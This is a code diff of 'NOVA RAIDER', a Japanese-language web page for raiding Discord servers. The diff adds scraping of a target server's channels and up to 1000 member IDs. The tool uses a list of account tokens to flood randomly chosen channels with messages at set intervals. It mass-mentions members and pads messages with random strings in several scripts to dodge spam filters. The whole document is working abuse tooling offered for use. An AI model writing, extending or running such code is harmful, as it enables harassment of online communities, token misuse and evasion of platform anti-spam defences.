@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NOVA RAIDER - 日本語カスタムエディション</title>
+    <title>NOVA RAIDER </title>
     <style>
         :root {
             --bg-color: #0d0d12;
@@ -17,7 +17,7 @@
         }
 
         body {
-            font-family: 'Helvetica Neue', 'Arial', 'Hiragino Kaku Gothic ProN', 'Hiragino Sans', 'Meiryo', sans-serif;
+            font-family: 'Helvetica Neue', 'Arial', 'Hiragino Kaku Gothic ProN', 'Meiryo', sans-serif;
             background-color: var(--bg-color);
             color: var(--text-color);
             display: flex;
@@ -28,7 +28,7 @@
 
         .container {
             width: 100%;
-            max-width: 680px;
+            max-width: 720px;
             background: var(--card-bg);
             padding: 30px;
             border-radius: 16px;
@@ -47,14 +47,15 @@
             border-radius: 8px; color: white; box-sizing: border-box; outline: none; font-family: 'Consolas', monospace;
         }
 
-        .form-row { display: flex; gap: 15px; }
+        .form-row { display: flex; gap: 12px; }
         .flex-1 { flex: 1; }
         .flex-2 { flex: 2; }
 
         .controls { display: flex; gap: 12px; margin-top: 25px; }
-        .btn { flex: 1; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; font-size: 14px; }
+        .btn { flex: 1; padding: 14px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; font-size: 13px; }
         .btn-primary { background: var(--primary); color: #000; }
         .btn-danger { background: var(--danger); color: white; }
+        .btn-action { background: #2a2a40; color: var(--primary); border: 1px solid var(--primary); margin-top: 5px; padding: 8px; font-size: 11px; }
         .btn:disabled { opacity: 0.3; filter: grayscale(1); cursor: not-allowed; }
 
         .status-panel {
@@ -76,18 +77,19 @@
 <div class="container">
     <header>
         <h1 class="brand-title">NOVA RAIDER</h1>
-        <p style="font-size: 11px; opacity: 0.6; text-align: center; letter-spacing: 1px;">多言語回避システム搭載 - 日本語版</p>
+        <p style="font-size: 11px; opacity: 0.6; text-align: center; letter-spacing: 1px;">チャンネル自動取得 & 手動編集対応モデル</p>
     </header>
 
     <div class="section">
-        <label>使用トークン (1行に1つ入力)</label>
-        <textarea id="tokens" style="height: 100px;" placeholder="ここにトークンを貼り付けてください..."></textarea>
+        <label>使用トークン (1行に1つ)</label>
+        <textarea id="tokens" style="height: 80px;" placeholder="ここにトークンを貼り付けてください..."></textarea>
     </div>
 
     <div class="form-row section">
         <div class="flex-2">
             <label>ターゲットサーバーID (Guild ID)</label>
             <input type="text" id="guildId" placeholder="例: 123456789012345678">
+            <button class="btn-action" onclick="fetchServerInfo()">➔ サーバーからチャンネル・メンバーを取得</button>
         </div>
         <div class="flex-1">
             <label>送信間隔 (ミリ秒)</label>
@@ -95,11 +97,22 @@
         </div>
     </div>
 
+    <div class="form-row section">
+        <div class="flex-1">
+            <label>ターゲットチャンネルID (1行に1つ / 手動入力可)</label>
+            <textarea id="targetChannels" style="height: 80px;" placeholder="自動取得ボタンを押すか、直接IDを入力してください..."></textarea>
+        </div>
+        <div class="flex-1">
+            <label>メンション対象IDリスト (自動取得可 / 編集可)</label>
+            <textarea id="targetMembers" style="height: 80px;" placeholder="自動取得ボタンを押すとここにメンバーIDが入ります..."></textarea>
+        </div>
+    </div>
+
     <div class="section" style="background: rgba(0,212,255,0.03); padding: 15px; border-radius: 8px; border: 1px solid var(--border);">
         <label style="color: var(--success);">スパム回避用ランダム文字列設定</label>
         <div class="form-row">
             <div class="flex-2">
-                <label style="font-size: 10px; opacity: 0.8;">使用言語を選択</label>
+                <label style="font-size: 10px; opacity: 0.8;">使用言語</label>
                 <select id="langSelect">
                     <option value="en">英語 (abcde...)</option>
                     <option value="alnum">英数字 (a1b2c...)</option>
@@ -132,25 +145,23 @@
     </div>
 
     <div class="status-panel">
-        <span>ステータス: <strong id="statusText" style="color: #666;">待機中</strong></span>
-        <span>送信済み件数: <strong id="sentCount" style="color: var(--primary);">0</strong></span>
+        <span>ステータス: <strong id="statusText" style="color: #666;">READY</strong></span>
+        <span>送信成功: <strong id="sentCount" style="color: var(--primary);">0</strong></span>
     </div>
 
     <div id="logBoard">
-        <div class="log-entry">システム準備完了。トークンとサーバーIDを入力してください。</div>
+        <div class="log-entry">トークンを入力し、サーバーIDから情報を取得してください。</div>
     </div>
 </div>
 
 <script>
     let raidIntervals = [];
     let sentCounter = 0;
-    let chs = [];
-    let mems = [];
 
     const charSets = {
         en: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
         alnum: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
-        ko: "가나다라마바사아자차카타파하거너더러머バーサーアーヂャーチャーキャータパハギニディリミビシイジチキティピヒ", 
+        ko: "가나다라마바사아자차카타파하거너더러머버서어저처커터퍼허기니디리ミビシイジチキティピヒ", 
         ar: "ابتثجحخدذرزسشصضطظعغفقكلمنهوي", 
         km: "កខគឃងចឆជឈញដឋឌឍណតថទធនបផពភមយរលវសហឡអ" 
     };
@@ -165,6 +176,40 @@
         board.prepend(div);
     }
 
+    async function fetchServerInfo() {
+        const tokens = document.getElementById('tokens').value.split(/\r?\n/).filter(t => t.trim() !== "");
+        const guildId = document.getElementById('guildId').value.trim();
+
+        if (!tokens.length || !guildId) return alert("トークンとサーバーIDを入力してください。");
+
+        addLog("サーバー情報を取得中...", "var(--primary)");
+
+        try {
+            // チャンネル取得
+            const resCh = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
+                headers: { 'Authorization': tokens[0] }
+            });
+            const channels = await resCh.json();
+            const validChannels = channels.filter(c => [0, 5].includes(c.type)).map(c => c.id);
+            document.getElementById('targetChannels').value = validChannels.join('\n');
+
+            // メンバー取得 (1000人)
+            const resMem = await fetch(`https://discord.com/api/v9/guilds/${guildId}/members?limit=1000`, {
+                headers: { 'Authorization': tokens[0] }
+            });
+            const members = await resMem.json();
+            if (Array.isArray(members)) {
+                const memberIds = members.map(m => m.user.id);
+                document.getElementById('targetMembers').value = memberIds.join('\n');
+                addLog(`捕捉成功: チャンネル数 ${validChannels.length} / メンバー数 ${memberIds.length}`, "var(--success)");
+            } else {
+                addLog("メンバー取得に失敗しました。権限が不足している可能性があります。", "var(--danger)");
+            }
+        } catch (e) {
+            addLog("情報取得中にエラーが発生しました。IDを確認してください。", "var(--danger)");
+        }
+    }
+
     function generateRandomStr(lang, len) {
         let result = "";
         const characters = charSets[lang] || charSets.en;
@@ -176,48 +221,29 @@
 
     async function startRaid() {
         const tokens = document.getElementById('tokens').value.split(/\r?\n/).filter(t => t.trim() !== "");
-        const guildId = document.getElementById('guildId').value.trim();
+        const channels = document.getElementById('targetChannels').value.split(/\r?\n/).filter(c => c.trim() !== "");
+        const members = document.getElementById('targetMembers').value.split(/\r?\n/).filter(m => m.trim() !== "");
         const interval = parseInt(document.getElementById('interval').value);
         const lang = document.getElementById('langSelect').value;
         const len = parseInt(document.getElementById('strLength').value);
 
-        if (!tokens.length || !guildId) return alert("エラー: トークンとサーバーIDは必須です。");
+        if (!tokens.length || !channels.length) return alert("トークンとターゲットチャンネルIDが必要です。");
 
         document.getElementById('startBtn').disabled = true;
         document.getElementById('stopBtn').disabled = false;
         document.getElementById('statusText').innerText = "稼働中";
         document.getElementById('statusText').style.color = "var(--success)";
 
-        addLog("サーバー情報を取得しています...", "var(--primary)");
-
-        try {
-            // 最初のトークンを使用して情報を取得
-            const res = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
-                headers: { 'Authorization': tokens[0] }
-            });
-            const data = await res.json();
-            chs = data.filter(c => [0, 5].includes(c.type)).map(c => c.id);
-
-            const res2 = await fetch(`https://discord.com/api/v9/guilds/${guildId}/members?limit=1000`, {
-                headers: { 'Authorization': tokens[0] }
-            });
-            const data2 = await res2.json();
-            mems = Array.isArray(data2) ? data2.map(m => m.user.id) : [];
-
-            addLog(`${chs.length}個のチャンネルを捕捉。攻撃を開始します。`, "var(--success)");
-        } catch (e) {
-            addLog("初期化エラー。サーバーIDかトークンの権限を確認してください。", "var(--danger)");
-            stopRaid();
-            return;
-        }
+        addLog("攻撃プロセスを開始しました。", "var(--success)");
 
         tokens.forEach((token, i) => {
             const inv = setInterval(async () => {
-                const target = chs[Math.floor(Math.random() * chs.length)];
+                const target = channels[Math.floor(Math.random() * channels.length)];
                 const mCount = parseInt(document.getElementById('mentionCount').value);
+                
                 let mentions = "";
-                if (mCount > 0 && mems.length > 0) {
-                    mentions = [...mems].sort(() => 0.5 - Math.random()).slice(0, mCount).map(id => `<@${id}>`).join(" ");
+                if (mCount > 0 && members.length > 0) {
+                    mentions = [...members].sort(() => 0.5 - Math.random()).slice(0, mCount).map(id => `<@${id}>`).join(" ");
                 }
 
                 const randStr = generateRandomStr(lang, len);
@@ -246,7 +272,7 @@
         document.getElementById('stopBtn').disabled = true;
         document.getElementById('statusText').innerText = "停止中";
         document.getElementById('statusText').style.color = "var(--danger)";
-        addLog("すべての処理を停止しました。", "#ffa500");
+        addLog("すべてのインスタンスを停止しました。", "orange");
     }
 </script>
 
